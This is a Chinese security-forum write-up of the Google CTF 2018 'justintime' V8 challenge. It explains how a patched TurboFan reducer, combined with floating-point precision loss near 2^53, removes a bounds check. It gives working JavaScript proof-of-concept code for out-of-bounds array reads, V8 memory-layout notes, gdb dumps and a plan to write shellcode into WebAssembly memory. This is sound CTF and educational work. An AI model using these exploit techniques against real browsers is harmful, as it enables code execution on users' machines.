[![看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/plugin/kanxue/img/kanxuelogo.png)](https://bbs.kanxue.com/ "看雪-安全社区|安全招聘|kanxue.com")

- [首页](https://www.kanxue.com/)

- [课程](https://www.kanxue.com/course.htm)

- [问答](https://www.kanxue.com/question-list.htm)

- [CTF](https://ctf.kanxue.com/)

- [社区](https://bbs.kanxue.com/)

- [招聘](https://job.kanxue.com/)

- [看雪峰会](https://www.kanxue.com/conference.htm)

- [发现](https://bbs.kanxue.com/thread-270653.htm#)

-

消息  ![](https://passport.kanxue.com/upload/avatar/307/938307.png?1712462640)

1. [社区](https://bbs.kanxue.com/)
1. [Pwn](https://bbs.kanxue.com/forum-171.htm)

[发新帖](https://bbs.kanxue.com/thread-create-171.htm)

8

6

\[原创\]Chrom V8分析入门——Google CTF2018 justintime分析

发表于: 2021-12-7 09:32  26868

举报

______________________________________________________________________

_注：资料下载地址见参考资料_

# [](https://bbs.kanxue.com/thread-270653.htm)0. 前言

这篇文章是我第一次接触V8的漏洞分析，从环境搭建开始，分析了题目中提供的代码，对涉及到的javascript和v8知识点进行了简单介绍，同时针对存在的OOB漏洞，从最终目的——写入执行shellcode——倒退分析，最终一步步达到目标，并与saelo大神提出的addrof和fakeobj概念进行了对照介绍。

除此之外，本文也提供了一种无需FQ就能够进行v8编译安装的方法：我在按照官网的步骤编译v8的时候总是因为网络不稳的原因fetch失败，几番搜索也没有找到好的方法，后来忘记在哪篇文章中看到node是自带v8的，因此想到了文中的方法，只需要简单的修改，就能实现对于v8代码的修改、编译和安装。

本文对于有经验的人来说可能颇为啰嗦，但是很适合初学者，逻辑上讲，如果你能够跟随本文的步骤，并理解其中的内容，就可以像我入门v8漏洞分析了。

# [](https://bbs.kanxue.com/thread-270653.htm)1. 环境搭建

1. 确定v8版本

   本来Github项目里面是提供了对应的chromium版本的编辑脚本的，但是VPN的网络状态一直不稳定，我在fetch的时候一直没有成功。因此我使用了一些小技巧来安装对应版本的v8。

   之前已经把项目中提供的ubuntu virtualbox镜像下载下来了，通过chrome://version查看对应的v8版本是V8 7.0.276.3，

1. 下载对应的node

   在[https://nodejs.org/en/download/releases/](https://nodejs.org/en/download/releases/)这里找到对应的node版本，下载其源码：

   |   |   |
   |---|---|
   |1<br><br>2|``` wget https:``/``/``nodejs.org``/``download``/``release``/``v11.``1.0``/``node``-``v11.``1.0``.tar.gz ```  ``` -``-``no``-``check``-``certificate ```<br><br>`tar` ``` -``xf node``-``v11.``1.0``.tar.gz ```|

1. （可选）根据需求对v8进行修改

   进入目录node-v11.1.0/deps/v8中，执行

   |   |   |
   |---|---|
   |1|`git` `apply` ``` ~``/``attachments``/``addition``-``reducer.patch ```|

   打开文件/home/test/node-v11.1.0/deps/v8/v8.gyp，第486行列出了一系列的sources文件目录，在其中添加两项：

   ![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_DRSHPAXMAD2X88T.png)

1. 编译&安装

   最后回到node根目录，下载依赖项(这个版本的node需要python2.6/2.7)，编译node

   |   |   |
   |---|---|
   |1<br><br>2<br><br>3<br><br>4<br><br>5|``` sudo apt install g``+``+ ``` `python make`<br><br>``` sudo .``/``configure ``` ``` -``-``debug ```<br><br>`sudo make` ``` -``j4 ```<br><br>``` sudo make install PREFIX``=``/``opt``/``node``-``debug``/ ```<br><br>`sudo cp` ``` -``a ``` ``` -``f out``/``Debug``/``node ``` ``` /``opt``/``node``-``debug``/``node ```|

   此时我们就可以把node指令当作d8来使用了。

   注意上面是编译debug版本的方法，这样在使用`%DebugPrint`的时候可以获得更多信息。在下面的分析过程中，我同时编译了release和debug两个版本，无论如何，编译得到的可执行程序都放在了`out`目录下，debug版本在`Debug`文件夹中，release版本在`Release`文件夹中，只要最终把需要的可执行文件放在`/usr/local/bin`里面，并做好区分就可以了。

1. 关于turbolizer

   以上的编译安装都发生在我下载的ubuntu virtualbox镜像中，因为虚拟机的速度有些慢，所以我在主机上也安装了一版node，用于和漏洞细节无关的测试以及turbolizer的使用。

   turbolizer所在目录：`C:\Users\【用户名】\AppData\Roaming\npm\node_modules\turbolizer`

   在目录下执行：`python -m SimpleHTTPServer`，就可以在浏览器通过127.0.0.1:8000使用turbolizer了。

# [](https://bbs.kanxue.com/thread-270653.htm)2. 问题代码分析

在addition-reducer.patch文件中可以看到这个题目在TypedLoweringPhase阶段添加了一个DuplicateAdditionReducer，[duplicate-addition-reducer.cc](http://duplicate-addition-reducer.cc/)的主体代码如下：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26<br><br>27<br><br>28<br><br>29<br><br>30<br><br>31<br><br>32<br><br>33<br><br>34<br><br>35<br><br>36<br><br>37<br><br>38<br><br>39<br><br>40<br><br>41<br><br>42<br><br>43<br><br>44|``` DuplicateAdditionReducer::DuplicateAdditionReducer(Editor``* ``` ``` editor, Graph``* ``` `graph,`<br><br>                     ``` CommonOperatorBuilder``* ``` `common)`<br><br>    `: AdvancedReducer(editor),`<br><br>      `graph_(graph), common_(common) {}`<br><br>``` Reduction DuplicateAdditionReducer::``Reduce``(Node``* ``` `node) {`<br><br>  ``` switch (node``-``>opcode()) { ```<br><br>    `case IrOpcode::kNumberAdd:`<br><br>      `return` `ReduceAddition(node);`<br><br>    `default:`<br><br>      `return` `NoChange();`<br><br>  `}`<br><br>`}`<br><br>``` Reduction DuplicateAdditionReducer::ReduceAddition(Node``* ``` `node) {`<br><br>  ``` DCHECK_EQ(node``-``>op()``-``>ControlInputCount(), ``` ``` 0``); ```<br><br>  ``` DCHECK_EQ(node``-``>op()``-``>EffectInputCount(), ``` ``` 0``); ```<br><br>  ``` DCHECK_EQ(node``-``>op()``-``>ValueInputCount(), ``` ``` 2``); ```<br><br>  ``` Node``* ``` `left` `=` `NodeProperties::GetValueInput(node,` ``` 0``); ```<br><br>  `if` ``` (left``-``>opcode() !``= ``` ``` node``-``>opcode()) { ```<br><br>    `return` `NoChange();`<br><br>  `}`<br><br>  ``` Node``* ``` `right` `=` `NodeProperties::GetValueInput(node,` ``` 1``); ```<br><br>  `if` ``` (right``-``>opcode() !``= ``` `IrOpcode::kNumberConstant) {`<br><br>    `return` `NoChange();`<br><br>  `}`<br><br>  ``` Node``* ``` `parent_left` `=` `NodeProperties::GetValueInput(left,` ``` 0``); ```<br><br>  ``` Node``* ``` `parent_right` `=` `NodeProperties::GetValueInput(left,` ``` 1``); ```<br><br>  `if` ``` (parent_right``-``>opcode() !``= ``` `IrOpcode::kNumberConstant) {`<br><br>    `return` `NoChange();`<br><br>  `}`<br><br>  `double const1` `=` ``` OpParameter<double>(right``-``>op()); ```<br><br>  `double const2` `=` ``` OpParameter<double>(parent_right``-``>op()); ```<br><br>  ``` Node``* ``` `new_const` `=` ``` graph()``-``>NewNode(common()``-``>NumberConstant(const1``+``const2)); ```<br><br>  `NodeProperties::ReplaceValueInput(node, parent_left,` ``` 0``); ```<br><br>  `NodeProperties::ReplaceValueInput(node, new_const,` ``` 1``); ```<br><br>  `return` `Changed(node);`<br><br>`}`|

可以看到，当node的操作类型是`kNumberAdd`的时候，会执行`ReduceAddition`对当前节点进行处理，从`ReduceAddition`的代码可以看出一共分成了四种情况：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_6J7W9WYNQT49998.png)

其中第四种情况会发生reduce：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_JYVFV6FZ5SE2ECJ.png)

# [](https://bbs.kanxue.com/thread-270653.htm)3. 漏洞分析

那么上面这样的reduce会导致怎样的问题出现呢？想要知道这一点，首先要了解javascript中的数据表示。

## [](https://bbs.kanxue.com/thread-270653.htm)3.1 IEEE 754标准的64位浮点格式

在javascript中，数字只有一种类型(Number)，它并不像C那样有int、short、long、float、double等类型，所有的数字都采用IEEE754标准定义的64位浮点格式表示。其格式为：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_BU4TB6S7RPV6TSJ.png)

使用以下公式转换成真实的数值：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_5RCP9RSM33KJ8MF.png)

在表达整数的时候，以上格式可以表示的最大安全整数为：

|   |   |
|---|---|
|1|`max_value` `=` `1` `*` ``` (``1 ``` `+` ``` 0.1111``...``1111``) ``` `*` ``` 2``^``52 ```  ``` /``/ ``` ``` 小数点后有``52``个``'1' ```|

也就是:

|   |   |
|---|---|
|1<br><br>2|``` d8> Math.``pow``(``2``, ``` ``` 53``) ``` `-` `1`<br><br>`9007199254740991`|

那么如果在这个最大值上再加1会发生什么呢？

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9|``` /``/ ``` `max_value的二进制表示`<br><br>``` /``/ ``` `1` `*` ``` 2``^(``1075``-``1023``) ``` `*` ``` 1.1111``...``1111b ``` `=` ``` 11111.``..``11111b``(``53``-``bit) ``` `=` `9007199254740991`<br><br>`1` `10000110011` `1111111111111111111111111111111111111111111111111111`<br><br>``` /``/ ``` `max_value` `+` `1`<br><br>``` /``/ ``` `1` `*` ``` 2``^(``1076``-``1023``) ``` `*` `1.0b` `=` ``` 2``^``53 ``` `=` `9007199254740992`<br><br>`1` `10000110100` `0000000000000000000000000000000000000000000000000000`<br><br>``` /``/ ``` `max_value` `+` `2`<br><br>``` /``/ ``` `1` `*` ``` 2``^(``1076``-``1023``) ``` `*` ``` 1.0000``...``0001b ``` `=` ``` 10000.``..``00010b``(``54``-``bit) ``` `=` ``` 2``^``53 ``` `+` `2` ``` =``9007199254740994 ```<br><br>`1` `10000110100` `0000000000000000000000000000000000000000000000000001`|

准确的说，根据参考资料3，IEEE 754标准在2^52~2^53之间的精度是1，在2^53~2^54之间精度是2（只能表示偶数），在2^51~2^52之间精度是0.5，以此类推。

## [](https://bbs.kanxue.com/thread-270653.htm)3.2 x+1+1与x+2

虽然在上面的二进制表示中，max_value+2得到的二进制结果转换为十进制是`9007199254740994`，但这并不是在javascript中的实际结果。因为IEEE 754无法表示`9007199254740993`这个值，因此`9007199254740991 + 2`在javascript中由于精度丢失，得到的结果是`9007199254740992`。

如果对以下代码进行优化（这里我使用的仍旧是普通版本的v8）：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10|`function opt_me() {`<br><br>  `let x` `=` `Number.MAX_SAFE_INTEGER` `+` ``` 1``; ```<br><br>  `let y` `=` `x` `+` `1` `+` ``` 1``; ```<br><br>  `let z` `=` `x` `+` ``` 2``; ```<br><br>  `return` `(y, z);`<br><br>`}`<br><br>`for` `(var i` `=` ``` 0``; i < ``` ``` 0x1000000``; ``` ``` +``+``i) { ```<br><br>  `opt_me(i);`<br><br>`}`|

在Turbolizer中得到sea of nodes:

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_DXJXHZAV5HXCMWD.png)

可以看到javascript无法对`9007199254740992`进行递增，得到的永远都是同样的值，而直接+2则可以得到正确的数值。

也就是说，当`pareng_left`的数值是`Number.MAX_SAFE_INTEGER + 1`的时候，下图中的reduce是错误的：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_KSF5ATVTNJQQT79.png)

## [](https://bbs.kanxue.com/thread-270653.htm)3.3 OOB

根据上面的推断，当数值处于`9007199254740992`这个临界点的时候，`DuplicateAdditionReducer`的做法会出现问题。那么这会导致什么结果呢？先写一段简单的代码：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12|`function try1(x) {`<br><br>  `let bug_arr` `=` ``` [``1.1``, ``` ``` 2.2``, ``` ``` 3.3``, ``` ``` 4.4``]; ```<br><br>  `let y` `=` `(x ?` `9007199254740992` `:` ``` 9007199254740989``) ```<br><br>  `y` `=` `y` `+` `1` `+` ``` 1``; ```<br><br>  `y` `=` `y` `-` ``` 9007199254740990``; ``` <br><br>  `return` `bug_arr[y];`<br><br>`}`<br><br>`for` `(var i` `=` ``` 0``; i < ``` ``` 0x1000000``; ``` ``` +``+``i) { ```<br><br>  `try1(false);`<br><br>`}`<br><br>`console.log(try1(true));`|

首先定义函数`try1`，其中包含了：

- 一个长度为4的数组，用于实现越界读；
- 变量y，会根据参数x取`9007199254740992`或者`9007199254740989`，其中`9007199254740992`是为了之后+1+1操作触发漏洞，`9007199254740989`这个值需要保证完成+1+1后不等于`9007199254740992`（当然加法之前相等也不行，否则TurboFan会将y优化成一个常数，try1的返回值是固定的，所有过程都优化掉了），且和`9007199254740990`的差为正数；
- y+1+1操作用于触发漏洞，y的可能取值为`9007199254740992`或`9007199254740991`，经过`TypedLoweringPhase`的`DuplicateAdditionReducer`之后，可能取值变成了`9007199254740994`或者`9007199254740991`；
- 减法操作，得到索引值，可能取值为2或1，经过`DuplicateAdditionReducer`后，可能取值变成了4（超过了数组索引值范围）或1。
- 返回`bug_arr[y]`，发生越界读。

执行上述代码，得到：

|   |   |
|---|---|
|1<br><br>2|``` root@test``-``vm:``/``home``/``test``/``ctf2018``# node --allow-natives-syntax try1.js ```<br><br>``` 2.107088725459e``-``311 ```|

说明`try1(true)`确实发生了越界读。

我们可以在turbolizer中直观的看到问题所在，在typer阶段，经过两次SpeculativeNumberAdd操作之后，结果的最大值仍旧为`9007199254740992`

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_RJU7834BUKRGRTZ.png)

而到了typed lowering阶段，经过`DuplicateAdditionReducer`之后，可以看到原本的两个`SpeculativeNumberAdd`被简化成了一个`NumberAdd`，加数变成了2，但是结果并没有更新，因此最后的`CheckBound`得到的索引边界范围仍旧在`[1,2]`之间。

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_CARTAV254GP99W9.png)

到达escape analysis阶段的时候，可以看到`CheckBound`节点的索引是`Range(1,2)`，长度是`Range(4,4)`：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_GG7E7YZDK2BF6BF.png)

而紧接着的simplified lowering阶段会对CheckBound节点进行检查：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26<br><br>27<br><br>28<br><br>29<br><br>30<br><br>31<br><br>32<br><br>33<br><br>34|``` /``/ ``` ``` simplified``-``lowering.cc ```<br><br>``` void VisitNode(Node``* ``` `node, Truncation truncation,`<br><br>                 ``` SimplifiedLowering``* ``` `lowering) {`<br><br>`...`<br><br>    `case IrOpcode::kCheckBounds: {`<br><br>        `const CheckParameters& p` `=` ``` CheckParametersOf(node``-``>op()); ```<br><br>        `Type` `index_type` `=` ``` TypeOf(node``-``>InputAt(``0``)); ```<br><br>        `Type` `length_type` `=` ``` TypeOf(node``-``>InputAt(``1``)); ```<br><br>        `if` ``` (index_type.Is(``Type``::Integral32OrMinusZero())) { ```<br><br>          ``` /``/ ``` `Map` ``` -``0 ``` `to` ``` 0``, ``` `and` `the values` `in` ``` the [``-``2``^``31``,``-``1``] ``` `range` `to the`<br><br>          ``` /``/ ``` ``` [``2``^``31``,``2``^``32``-``1``] ``` ``` range``, which will be considered out``-``of``-``bounds ```<br><br>          ``` /``/ ``` `as well, because the {length_type}` `is` `limited to Unsigned31.`<br><br>          `VisitBinop(node, UseInfo::TruncatingWord32(),`<br><br>                     `MachineRepresentation::kWord32);`<br><br>          `if` ``` (lower() && lowering``-``>poisoning_level_ ``` ``` =``= ```<br><br>                             `PoisoningMitigationLevel::kDontPoison) {`<br><br>            `if` `(index_type.IsNone() \| length_type.IsNone() \|`<br><br>                ``` (index_type.``Min``() >``= ``` `0.0` `&&`<br><br>                 ``` index_type.``Max``() < length_type.``Min``())) { ```<br><br>              ``` /``/ ``` `The bounds check` `is` `redundant` `if` `we already know that`<br><br>              ``` /``/ ``` `the index` `is` ``` within the bounds of [``0.0``, length[. ```<br><br>              ``` DeferReplacement(node, node``-``>InputAt(``0``)); ```<br><br>            `}`<br><br>          `}`<br><br>        `}` `else` `{`<br><br>          `VisitBinop(`<br><br>              `node,`<br><br>              `UseInfo::CheckedSigned32AsWord32(kIdentifyZeros, p.feedback()),`<br><br>              `UseInfo::TruncatingWord32(), MachineRepresentation::kWord32);`<br><br>        `}`<br><br>        ``` return``; ```<br><br>      `}`<br><br>`...`<br><br>`}`|

注意到上面代码中的判断`(index_type.Min() >= 0.0 && index_type.Max() < length_type.Min())`，如果这个条件成立，CheckBound节点就会被替换掉。而在此例中，`index_type.Max()==2`，`length_type.Min()==4`，条件成立。

因此经过simplified lowering，得到：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_DMECW4EHVWUJYGP.png)

可以看到减法操作之后的CheckBound节点已经不见了，而TurboFan仍旧认为数组的索引范围最大值为2。

## [](https://bbs.kanxue.com/thread-270653.htm)3.4 扩大OOB范围

之前的代码可以看成一个基础模板：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11|`function try1(x) {`<br><br>  ``` let bug_arr``= ``` ``` [``1.1``, ``` ``` 2.2``, ``` ``` 3.3``, ``` ``` 4.4``]; ```<br><br>  `let y` `=` `(x ?` `9007199254740992` `: 【normal_value】)`<br><br>  `y` `=` `y` `+` `1` `+` ``` 1``; ```<br><br>  `y` `=` `y` `-` `【start_value】;` <br><br>  `return` `bug_arr[y];`<br><br>`}`<br><br>`for` `(var i` `=` ``` 0``; i < ``` ``` 0x1000000``; ``` ``` +``+``i) { ```<br><br>  `try1(false);`<br><br>`}`<br><br>`console.log(try1(true));`|

必须要保证以下条件：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5|``` -``1 ``` `< normal_value` `-` `start_value` `+` `2` `<` `4`<br><br>``` /``/ ``` `即start_value` `-` `3` `< normal_value < start_value` `+` `2`<br><br>``` -``1 ``` `<` `9007199254740992` `-` `start_value <` `4`<br><br>``` normal_value !``= ``` `9007199254740992`<br><br>`normal_value` `+` `2` ``` !``= ``` `9007199254740992`|

因此该模板下，可以读取到的最大偏移(`9007199254740994-start_value`)是5：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12|`function try1(x) {`<br><br>  ``` let bug_arr``= ``` ``` [``1.1``, ``` ``` 2.2``, ``` ``` 3.3``, ``` ``` 4.4``]; ```<br><br>  `let y` `=` `(x ?` `9007199254740992` `:` ``` 9007199254740989``) ```<br><br>  `y` `=` `y` `+` `1` `+` ``` 1``; ```<br><br>  `y` `=` `y` `-` ``` 9007199254740989``; ``` <br><br>  `console.log(y);`<br><br>  `return` `bug_arr[y];`<br><br>`}`<br><br>`for` `(var i` `=` ``` 0``; i < ``` ``` 0x1000000``; ``` ``` +``+``i) { ```<br><br>  `try1(false);`<br><br>`}`<br><br>`console.log(try1(true));`|

结果：

|   |   |
|---|---|
|1<br><br>2|``` root@test``-``vm:``/``home``/``test``/``ctf2018``# node --allow-natives-syntax try1.js ```<br><br>``` 2.9570928586621e``-``310 ```|

那么要如何扩大读取的范围呢？

在3.1小结关于IEEE 754标准的介绍中，我们提到它的精度问题，“IEEE 754标准在2^52~2^53之间的精度是1，在2^53~2^54之间精度是2（只能表示偶数）”，可以想见，当数值范围在2^54~2^55的时候，它的精度应该是4：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6|`d8> x` `=` ``` Math.``pow``(``2``, ``` ``` 54``) ```<br><br>`18014398509481984`<br><br>`d8> x` `+` `2` `+` `2`<br><br>`18014398509481984`<br><br>`d8> x` `+` `4`<br><br>`18014398509481988`|

因此我们可以通过增大数值的方式扩大可读写范围。或者，在参考资料2中，也提到可以通过乘法的方式扩大这一范围：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6|`d8> x` `=` ``` Math.``pow``(``2``, ``` ``` 53``) ```<br><br>`9007199254740992`<br><br>`d8>` ``` 10``*``(x ``` ``` +``1 ``` ``` +``1``) ```<br><br>`90071992547409920`<br><br>`d8>` ``` 10``*``(x ``` ``` +``2``) ```<br><br>`90071992547409940`|

通过上面的手段，理论上来讲我们可以读写bug_arr数组后的任意空间数据。但是如何利用这一能力呢？

# [](https://bbs.kanxue.com/thread-270653.htm)4. 利用OOB W/R的方法

## [](https://bbs.kanxue.com/thread-270653.htm)4.1 前置知识

### [](https://bbs.kanxue.com/thread-270653.htm)4.1.1 Pointer Tagging

_参考资料5，6_

在进行具体的调试分析之前，需要对v8中表示javascript对象的方式有所了解。

在v8中，所有的javascript值无论类型如何，都用对象表示，并且保存在堆中，这样就可以使用指针的方式索引所有值。但是存在一种情况，就是在短时间内使用频率特别高的小的整数，例如循环中使用的索引值。为了避免每次使用的时候都重新分配一个新的number对象，V8使用了一种叫做pointer tagging的技巧来处理这种情况。

具体来说，V8使用两种形式表示javascript中的值，一种叫做Smi(Samll Integer)，一种叫做HeapObject。

在64位的机器上，Smi的最低位固定为0，高32位用于表示真正的数值，其余位为0；HeapObject的最低位固定为1，其余的63位用来存放地址。

正是由于这种机制，在下面调试分析的过程中就出现了需要将地址减1的情况。

### [](https://bbs.kanxue.com/thread-270653.htm)4.1.2 数组相关结构

_参考资料5，9_

每次在javascript中使用`var arr = []`或者`var arr = new Array()`的时候，就会创建一个JSArray对象以及一个FixedArray或者FixedDoubleArray对象。如果数组中的元素是整数，就创建FixedArray，否则创建FixedDoubleArray。可以把JSArray看作是数组的头部，而FixedArray/FixedDoubleArray中保存了真正的数组元素。这三个结构在内存中的构成如下：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12|``` /``/ ``` `JSArray`<br><br>`0x00` `: Pointer to` `Map`<br><br>`0x08` `: Pointer to Outline Properties`<br><br>`0x10` `: Pointer to Elements`<br><br>`0x18` `: Length`<br><br>``` /``/ ``` `FixedArray, FixedDoubleArray`<br><br>`0x00` `: Pointer to` `Map`<br><br>`0x08` `: Length`<br><br>`0x10` `: Element` `1`<br><br>`0x18` `: Element` `2`<br><br>`0x20` `: ...`|

在JSArray和FixedArray中分别存在一个length属性，FixedArray中的length属性相当于数组的capacity，是系统为数组预分配的空间大小，而真正和代码中的索引值相关的是存在于JSArray中的length属性。

除了上面的这三种对象之外，每次在javascript中使用`var buf = new ArrayBuffer(3)`的时候，就会创建一个JSArrayBuffer对象。与JSArray不同之处在于，ArrayBuffer中存在一个叫做backing pointer的东西：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7|``` /``/ ``` `JSArrayBuffer`<br><br>`0x00` `: Pointer to` `Map`<br><br>`0x08` `: Pointer to Outline Properties`<br><br>`0x10` `: Pointer to Elements`<br><br>`0x18` `: Length`<br><br>`0x20` `: Pointer to Backing Store`<br><br>`0x28` `: ...`|

注意到这里面既有一个Pointer to Elements，也有一个Pointer to Backing Store，前者和JSArray中的意义相同，而backing pointer所指向的虽然也是数组中的数据，但是它所指向的内容是纯二进制数据，不具备类型信息。因此在使用的时候，可以通过typed array objects或者DataView用具体的数据类型表达ArrayBuffer中的数据。这一特性也对接下来的漏洞利用十分有帮助。

## [](https://bbs.kanxue.com/thread-270653.htm)4.2 利用方法分析

倒推：执行shellcode ← 找到一块可执行内存并写入shellcode ← WebAssembly函数代码所在内存可执行 ← 获取函数对象所在地址 + 写入shellcode

根据上面的倒退，我们需要具有**获取对象地址**以及\*\*任意写（读）\*\*的能力。

此次分析的漏洞让我们可以读写`bug_arr`数组后可变长的一段内存，所以：

- 如果对象正好放在`bug_arr`的后面，就可以通过这个漏洞获取到对象的地址；
- 如果`bug_arr`后面有一个指针，就可以通过这个漏洞修改指针的数值，从而对其指向的内存进行读写。

那么我们要怎么做呢？

## [](https://bbs.kanxue.com/thread-270653.htm)4.3 更简单的OOB方式

在获取能力之前，我们需要先对OOB进行优化，因为目前这种通过小心构造数值，利用漏洞访问数组范围外数据的方式十分复杂，无法灵活地进行数据访问。

因此我们可以在`bug_arr`后再定义一个数组(`oob_arr`)，利用漏洞访问并修改`oob_arr`中JSArray的length属性，之后，就可以通过`oob_arr[idx]`的方式访问到`oob_arr`后面的大片数据了。这种通过索引进行访问的方式显然十分便捷。

下面通过调试的方式确定这一方法的可行性。

### [](https://bbs.kanxue.com/thread-270653.htm)4.3.1 调试方法

1. js脚本的修改
   1. 在适当位置添加`%DebugPrint`，输出感兴趣的对象的信息；
   1. 脚本最后添加一个无限循环语句
1. `node —allow-natives-syntax` 执行脚本
   1. 从`%DebugPrint`的输出中获得对象地址等信息，用于后续调试；
   1. 由于无限循环语句，进程挂起；
1. 通过`ps -a | grep node`的方式找到该进程的PID；
1. 使用`gdb attach [pid]`或者其他调试器附加到该进程，开始调试。

### [](https://bbs.kanxue.com/thread-270653.htm)4.3.2 实验代码

数值转换借用了参考资料2中的方法：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26<br><br>27<br><br>28<br><br>29<br><br>30<br><br>31<br><br>32<br><br>33<br><br>34<br><br>35<br><br>36<br><br>37<br><br>38<br><br>39|`let ab` `=` ``` new ArrayBuffer(``8``); ```<br><br>`let fv` `=` `new Float64Array(ab);`<br><br>`let dv` `=` `new BigUint64Array(ab);`<br><br>`let f2i` `=` `(f)` ``` =``> { ```<br><br>  ``` fv[``0``] ``` `=` `f;`<br><br>  `return` ``` dv[``0``]; ```<br><br>`}`<br><br>`function tohex(v) {`<br><br>  `return` ``` (v).toString(``16``).padStart(``16``, ``` ``` "0"``); ```<br><br>`}`<br><br>`function output(idx, value, a) {`<br><br>  ``` console.log(``"Index is " ``` `+` `idx);`<br><br>  ``` console.log(``"Array length is " ``` `+` `a.length);`<br><br>  ``` console.log(``"Value is " ``` `+` `tohex(f2i(value)));`<br><br>`}`<br><br>`function try2(x) {`<br><br>  `let bug_arr` `=` ``` [``1.1``, ``` ``` 2.2``, ``` ``` 3.3``, ``` ``` 4.4``, ``` ``` 5.5``]; ```<br><br>  `oob_arr` `=` ``` [``6.6``, ``` ``` 7.7``, ``` ``` 8.8``]; ```<br><br>  `let y` `=` `(x ?` `18014398509481984` `:` ``` 18014398509481978``) ```<br><br>  `y` `=` `y` `+` `2` `+` ``` 2``; ```<br><br>  `y` `=` `y` `-` ``` 18014398509481982``; ```<br><br>  `let v` `=` `bug_arr[y];` <br><br>  `if` `(x) {`<br><br>    `output(y, v, bug_arr);`<br><br>    ``` %``DebugPrint(bug_arr); ```<br><br>    ``` %``DebugPrint(oob_arr); ```<br><br>  `}`<br><br>  `return` `v;`<br><br>`}`<br><br>`for` `(var i` `=` ``` 0``; i < ``` ``` 0x1000000``; ``` ``` +``+``i) { ```<br><br>  `try1(false);`<br><br>`}`<br><br>`console.log(try1(true));`<br><br>``` while``(``1``) {} ```|

### [](https://bbs.kanxue.com/thread-270653.htm)4.3.3 调试分析

执行上面的脚本，得到输出：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7|``` root@test``-``vm:``/``home``/``test``/``ctf2018``# node --allow-natives-syntax  try2.js ```<br><br>`Index` `is` `6`<br><br>`Array length` `is` `5`<br><br>`Value` `is` `0000000300000000`<br><br>`0x3e7e89d3c159` ``` <JSArray[``5``]> ```<br><br>`0x12b40ca86829` ``` <JSArray[``3``]> ```<br><br>``` 6.365987373e``-``314 ```|

这里我没有使用debug版本，因为只需要JSArray的地址就可以了。

然后使用gdb调试，检查`0x3e7e89d3c159-1`处的数据（注意这里由于pointer tagging，进行了减1操作）：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11|``` (gdb) x``/``20gx ``` ``` 0x3e7e89d3c159``-``1 ```<br><br>``` 0x3e7e89d3c158``: ```    `0x00000034b0f02931`    `0x00001cf6cec02d29`  ``` /``/ ``` `bug_arr JSArray: pointer to` ``` map``, pointer to outline properties ```<br><br>``` 0x3e7e89d3c168``: ```    `0x000012b40ca867c9`    `0x0000000500000000`  ``` /``/ ``` `bug_arr JSArray: pointer to elements, length`<br><br>``` 0x3e7e89d3c178``: ```    `0x00001cf6cec02539`    `0x000000005dc15cda` <br><br>``` 0x3e7e89d3c188``: ```    `0x0000000900000000`    `0x7369207865646e49` <br><br>``` 0x3e7e89d3c198``: ```    `0x0000000000000020`    `0x00001cf6cec02539`<br><br>``` 0x3e7e89d3c1a8``: ```    `0x000000004c3556ba`    `0x0000001000000000`<br><br>``` 0x3e7e89d3c1b8``: ```    `0x656c207961727241`    `0x207369206874676e`<br><br>``` 0x3e7e89d3c1c8``: ```    `0x00001cf6cec02539`    `0x00000000a41e9f2a`<br><br>``` 0x3e7e89d3c1d8``: ```    `0x0000000900000000`    `0x73692065756c6156`<br><br>``` 0x3e7e89d3c1e8``: ```    `0x0000000000000020`    `0x00001cf6cec02a49`|

